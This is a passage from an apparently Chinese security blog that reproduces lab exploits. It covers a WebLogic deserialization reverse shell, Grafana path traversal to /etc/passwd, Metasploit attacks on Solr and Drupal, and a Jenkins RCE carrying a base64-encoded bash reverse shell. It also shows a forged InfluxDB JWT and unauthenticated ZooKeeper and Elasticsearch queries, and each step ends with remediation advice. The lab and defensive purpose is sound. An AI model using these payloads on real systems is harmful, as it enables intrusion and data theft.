method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;&lt;&#x2F;java&gt;&lt;&#x2F;work:WorkContext&gt;&lt;&#x2F;soapenv:Header&gt;&lt;soapenv:Body&#x2F;&gt;&lt;&#x2F;soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过Burp发包如下：</p><p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"></p><p>反弹shell成功：</p><p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png"> </p><h3 id="修复方案：-10"><a href="#修复方案：-10" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.临时方案</p><p>删除WebLogicwls-wsat组件：</p><pre class="line-numbers language-none"><code class="language-none">rm -fr &#x2F;home&#x2F;WebLogic&#x2F;Oracle&#x2F;Middleware&#x2F;wlserver_10.3&#x2F;server&#x2F;lib&#x2F;wls-wsat.warrm –fr &#x2F;home&#x2F;WebLogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;.internal&#x2F;wls-wsat.warrm -fr  &#x2F;home&#x2F;WebLogic&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启Weblogic域控制器服务：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;user_projects&#x2F;domains&#x2F;basicWLSDomain&#x2F;bin&#x2F;stopWeblogic.sh       &#x2F;home&#x2F;weblogic&#x2F;Oracle&#x2F;user_projects&#x2F;domains&#x2F;basicWLSDomain&#x2F;bin&#x2F;startManagedWebLogic.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.通过补丁升级</p><h2 id="step12-grafana任意文件读取漏洞"><a href="#step12-grafana任意文件读取漏洞" class="headerlink" title="step12:grafana任意文件读取漏洞"></a>step12:grafana任意文件读取漏洞</h2><h3 id="漏洞概述：-11"><a href="#漏洞概述：-11" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。</p><p>Grafana 8.x API存在任意文件读取漏洞，未经授权的攻击者可利用该漏洞读取目标服务器任意文件，可导致服务器敏感信息泄漏。</p><h3 id="漏洞影响版本：-11"><a href="#漏洞影响版本：-11" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Grafana 8.3.x &lt; 8.3.1</p><p>Grafana 8.2.x &lt; 8.2.7</p><p>Grafana 8.1.x &lt; 8.1.8</p><p>Grafana 8.0.x &lt; 8.0.7</p><h3 id="漏洞复现：-11"><a href="#漏洞复现：-11" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>该漏洞主要是grafana里面得插件出现了问题导致可以任意文件读取</p><pre class="line-numbers language-none"><code class="language-none">poc：&#x2F;public&#x2F;plugins&#x2F;alertlist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;annolist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;grafana-azure-monitor-datasource&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;barchart&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;bargauge&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;cloudwatch&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;dashlist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;elasticsearch&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;gauge&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;geomap&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;gettingstarted&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;stackdriver&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;graph&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;graphite&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;heatmap&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;histogram&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;influxdb&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;jaeger&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;logs&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;loki&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;mssql&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;mysql&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;news&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;nodeGraph&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;opentsdb&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;piechart&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;pluginlist&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;postgres&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;prometheus&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;stat&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;state-timeline&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;status-history&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;table&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;table-old&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;tempo&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;testdata&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;text&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;timeseries&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;welcome&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;public&#x2F;plugins&#x2F;zipkin&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/grafana.png"></p><h3 id="修复方案：-11"><a href="#修复方案：-11" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、尽快升级至安全版本。</p><p>2、配置访问控制策略，仅对允许白名单地址访问，避免Grafana资产在互联网暴露。</p><h2 id="step13-Apache-Solr远程代码执行漏洞复现"><a href="#step13-Apache-Solr远程代码执行漏洞复现" class="headerlink" title="step13:Apache Solr远程代码执行漏洞复现"></a>step13:Apache Solr远程代码执行漏洞复现</h2><h3 id="漏洞概述：-12"><a href="#漏洞概述：-12" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p><h3 id="漏洞影响版本：-12"><a href="#漏洞影响版本：-12" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>solr 8.1.1</p><p>solr 8.2.0</p><h3 id="漏洞复现：-12"><a href="#漏洞复现：-12" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>利用kali里得msfconsole的multi&#x2F;misc&#x2F;java_jmx_server模块进行攻击。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;misc&#x2F;java_jmx_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png"> </p><pre class="line-numbers language-none"><code class="language-none">show optionsset RHOSTS 192.168.88.111   &#x2F;&#x2F;靶场的IPset RPORT 18983            &#x2F;&#x2F;靶场jmx服务的端口run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2.png"></p><p>执行linux基础命令查看权限和ip</p><p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C3.png"> </p><h3 id="修复方案：-12"><a href="#修复方案：-12" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、配置文件solr.in.sh的配置选项<strong>ENABLE_REMOTE_JMX_OPTS</strong>值改为”false”，然后重启</p><p>2、升级Solr版本</p><h2 id="step14-drupl-命令执行漏洞（CVE-2014-3704）"><a href="#step14-drupl-命令执行漏洞（CVE-2014-3704）" class="headerlink" title="step14:drupl 命令执行漏洞（CVE-2014-3704）"></a>step14:drupl 命令执行漏洞（CVE-2014-3704）</h2><h3 id="漏洞概述：-13"><a href="#漏洞概述：-13" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，执行任意代码。</p><h3 id="漏洞影响版本：-13"><a href="#漏洞影响版本：-13" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>drupl 7.0~7.31</p><h3 id="漏洞复现：-13"><a href="#漏洞复现：-13" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>msf工具利用</p><p>搜索drupal漏洞利用模块:</p><pre class="line-numbers language-none"><code class="language-none">search drupal <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用CVE-2014-3704对应的攻击模块:</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/drupal1.png"></p><p>设置Drupal网站路径:</p><pre class="line-numbers language-none"><code class="language-none">set targeturi &#x2F;drupal-7.31&#x2F;  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置攻击的ip和端口:</p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.88.111set rport 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/drupal2.png"> </p><p>发动攻击, 拿到shell:</p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/drupal3.png"></p><h3 id="修复方案：-13"><a href="#修复方案：-13" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.使用的是Drupal 7，更新至Drupal 7.74；</p><p>2.使用的是Drupal 8.8或更早版本，更新到Drupal 8.8.11；</p><p>3.使用的是Drupal 8.9，更新至Drupal 8.9.9；</p><p>4.使用的是Drupal 9.0，更新至Drupal 9.0.8；</p><p>5.审核所有以前上传的文件，以检查是否有恶意扩展名。可专门查找包含多个扩展名的文件，例如filename.php.txt或filename.html.gif，扩展名中不带下划线(_)。需要特别注意以下文件扩展名phar、php、pl、py、cgi、asp、js、html、htm、phtml等，即使后面有一个或多个其他扩展名，也应将其视为危险文件。</p><h2 id="step15-jenkins命令执行"><a href="#step15-jenkins命令执行" class="headerlink" title="step15:jenkins命令执行"></a>step15:jenkins命令执行</h2><h3 id="漏洞概述：-14"><a href="#漏洞概述：-14" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。通过这个漏洞，可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p><h3 id="漏洞影响版本：-14"><a href="#漏洞影响版本：-14" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Jenkins 2.153及更早版本，LTS 2.138.3及更早版本</p><h3 id="漏洞复现：-14"><a href="#漏洞复现：-14" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><pre class="line-numbers language-none"><code class="language-none">python exp.py http:&#x2F;&#x2F;192.168.88.111:8080&#x2F; &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjExMS80NDQ0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/jenkins%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1.png"></p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/jenkins%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2.png"></p><h3 id="修复方案：-14"><a href="#修复方案：-14" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.升级到最新版本或打上相关补丁</p><p>2.尽量不要开放到公网上</p><p>3.限制IP访问</p><h2 id="step16-Apache-Druid-任意文件读取"><a href="#step16-Apache-Druid-任意文件读取" class="headerlink" title="step16:Apache Druid 任意文件读取"></a>step16:Apache Druid 任意文件读取</h2><h3 id="漏洞概述：-15"><a href="#漏洞概述：-15" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。由于 Apache Druid 默认情况下是缺乏授权认证，攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。</p><h3 id="漏洞影响版本：-15"><a href="#漏洞影响版本：-15" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><pre class="line-numbers language-none"><code class="language-none">Apache Druid Version &lt;0.22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="漏洞复现：-15"><a href="#漏洞复现：-15" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>主页–&gt;Load data –&gt;HTTP(s)–&gt;Connect Data–&gt;URIs处(写入file:&#x2F;&#x2F;协议进行读取)-&gt; Apply -&gt; 显示文件内容</p><p><img src="/2023/08/19/images1/druid1.png"></p><p><img src="/2023/08/19/images1/druid2.png"></p><p><img src="/2023/08/19/images1/druid3.png"></p><h3 id="修复方案：-15"><a href="#修复方案：-15" class="headerlink" title="修复方案："></a>修复方案：</h3><p>对Apache Druid做鉴权处理 </p><p>升级到最新版本 </p><h2 id="step17：influxDB认证绕过漏洞"><a href="#step17：influxDB认证绕过漏洞" class="headerlink" title="step17：influxDB认证绕过漏洞"></a>step17：influxDB认证绕过漏洞</h2><h3 id="漏洞概述：-16"><a href="#漏洞概述：-16" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p> InfluxDB是一个使用Go语言编写的开源<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">分布式</a>，支持高并发的时序数据库，其使用JWT作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，JWT的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p><h3 id="漏洞影响版本：-16"><a href="#漏洞影响版本：-16" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><pre class="line-numbers language-none"><code class="language-none">Influxdb &lt; 1.7.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="漏洞复现：-16"><a href="#漏洞复现：-16" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>利用路线：</p><p>Influxdb http query接口—&gt; 生成jwt凭证绕过认证 —&gt;任意sql语句执行</p><p>访问<a href="http://your-ip:8086/debug/vars%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%BA%9B%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E3%80%82">http://your-ip:8086/debug/vars即可查看一些服务信息。</a></p><p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E1.png"></p><p>执行SQL语句则会出现401错误，提示没有用户认证。</p><p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E2.png"></p><p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p><p>地址：<a href="https://jwt.io/">https://jwt.io/</a></p><pre class="line-numbers language-none"><code class="language-none">&#123; “alg”: “HS256”, “typ”: “JWT” &#125; &#123; “username”: “admin”, “exp”: 1716239022 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E3.png"></p><pre class="line-numbers language-none"><code class="language-none">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE2MjM5MDIyfQ.jo8FUdPG0-_DBrXzkWvIja5fNbK-1rgs8pss46nKJuE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E4.png"></p><h3 id="修复方案：-16"><a href="#修复方案：-16" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.在配置文件给shared-secret参数添加一个特定值。</p><p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E5.png"> </p><p>2.本漏洞影响InfluxDB 1.7.5 及以下全版本，升级到1.7.5版本以上</p><h2 id="step18：zookeeper未授权访问漏洞"><a href="#step18：zookeeper未授权访问漏洞" class="headerlink" title="step18：zookeeper未授权访问漏洞"></a>step18：zookeeper未授权访问漏洞</h2><h3 id="漏洞概述：-17"><a href="#漏洞概述：-17" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p><p>ZooKeeper默认开启在<code>2181</code>端口，在未进行任何访问控制情况下，攻击者可通过执行<code>envi</code>命令获得系统大量的敏感信息，包括系统名称、Java环境。</p><h3 id="漏洞影响版本：-17"><a href="#漏洞影响版本：-17" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>zookeeper全版本</p><h3 id="漏洞复现：-17"><a href="#漏洞复现：-17" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p><p>1、stat：列出关于性能和连接的客户端的统计信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token function">stat</span> <span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> <span class="token number">2181</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、ruok：测试服务器是否运行在非错误状态。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> ruok <span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> <span class="token number">2181</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、reqs：列出未完成的请求。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> reqs <span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> <span class="token number">2181</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、envi：打印有关服务环境的详细信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> envi <span class="token operator">|</span><span class="token function">nc</span> iP <span class="token number">2181</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5、dump：列出未完成的会话和临时节点。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> dump <span class="token operator">|</span><span class="token function">nc</span> <span class="token function">ip</span> <span class="token number">2181</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.png"></p><h3 id="修复方案：-17"><a href="#修复方案：-17" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、修改 ZooKeeper 默认端口，采用其他端口服务。<br>2、添加访问控制，配置服务来源地址限制策略。<br>3、增加 ZooKeeper 的认证配置。</p><h2 id="step19-elasticsearch未授权访问漏洞"><a href="#step19-elasticsearch未授权访问漏洞" class="headerlink" title="step19:elasticsearch未授权访问漏洞"></a>step19:elasticsearch未授权访问漏洞</h2><h3 id="漏洞概述：-18"><a href="#漏洞概述：-18" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限并能进行任意命令执行，使得业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。</p><h3 id="漏洞影响版本：-18"><a href="#漏洞影响版本：-18" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>全版本</p><h3 id="漏洞复现：-18"><a href="#漏洞复现：-18" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indiceshttp:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_search 查看数据库敏感信息http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes 查看节点数据如有安装head插件：http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F; web管理界面<span 